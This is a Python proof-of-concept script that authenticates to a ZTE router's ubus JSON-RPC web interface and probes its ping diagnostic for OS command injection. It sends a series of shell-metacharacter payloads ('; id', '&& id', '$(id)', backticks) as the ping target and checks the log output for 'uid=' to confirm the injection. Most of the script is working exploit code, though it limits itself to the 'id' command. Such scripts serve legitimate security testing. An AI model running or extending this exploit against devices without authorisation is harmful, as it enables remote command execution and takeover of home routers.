#!/usr/bin/env python3
"""ZTE ping diag + injection test. ROUTER_PW env.

1. baseline ping 127.0.0.1 (action "check") -> read /log/PingMessages
2. injection ping "<ip>; id" -> read /log/PingMessages for command output
"""
import os, sys, json, time, hashlib, urllib.request, http.cookiejar

GW=os.environ.get("GW","192.168.0.1"); PW=os.environ["ROUTER_PW"]; ANON="0"*32
T=lambda:int(time.time()*1000)
_J=http.cookiejar.CookieJar(); OP=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(_J))
def post(pl):
    req=urllib.request.Request(f"http://{GW}/ubus/?t={T()}",data=json.dumps(pl).encode(),
        headers={"Content-Type":"application/json","Accept":"*/*","User-Agent":"Mozilla/5.0",
        "Origin":f"http://{GW}/","Referer":f"http://{GW}/","Z-Mode":"1"})
    try:
        with OP.open(req,timeout=30) as r: return json.loads(r.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return [{"error":{"code":e.code}}]
def call(s,o,m,p=None):
    for _ in range(3):
        r=post([{"jsonrpc":"2.0","id":1,"method":"call","params":[s,o,m,p or {}]}])[0]
        if not (isinstance(r,dict) and r.get("error",{}).get("code")==400): return r
        time.sleep(0.3)
    return r
def get(path):
    req=urllib.request.Request(f"http://{GW}/{path}",headers={"User-Agent":"Mozilla/5.0","Referer":f"http://{GW}/"})
    try:
        with OP.open(req,timeout=15) as r: return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")
def sha(s): return hashlib.sha256(s.encode()).hexdigest().upper()
def st(r):
    if "error" in r: return f"ERR{r['error'].get('code')}"
    res=r.get("result"); return f"[{res[0] if res else '?'}] {json.dumps(res[1])[:160] if res and len(res)>1 else ''}"

salt=call(ANON,"zwrt_web","web_login_info",{})["result"][1]["zte_web_sault"]
s=call(ANON,"zwrt_web","web_login",{"password":sha(sha(PW)+salt)})["result"][1]["ubus_rpc_session"]
print("session",s[:8])

def run_ping(label, target, action="check", wait=4.0):
    print(f"\n===== {label}: target={target!r} action={action!r} =====")
    r=call(s,"zwrt_router.api","router_set_ping_diagnose",{"ping_target":target,"ping_action":action})
    print("  set ->", st(r))
    time.sleep(wait)
    code,body=get("log/PingMessages")
    print(f"  GET /log/PingMessages [{code}] ({len(body)} bytes):")
    for ln in body.splitlines()[:25]:
        print("    |", ln)
    return body

# 1. clean baseline
run_ping("BASELINE clean", "127.0.0.1")
# 2. injection tests (safe: id only)
for payload in ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id",
                "$(id)", "127.0.0.1`id`", "127.0.0.1;id;"]:
    body=run_ping("INJECTION", payload, wait=3.0)
    if "uid=" in body:
        print("\n  >>>>>> COMMAND INJECTION CONFIRMED (uid= in output) <<<<<<")
        break
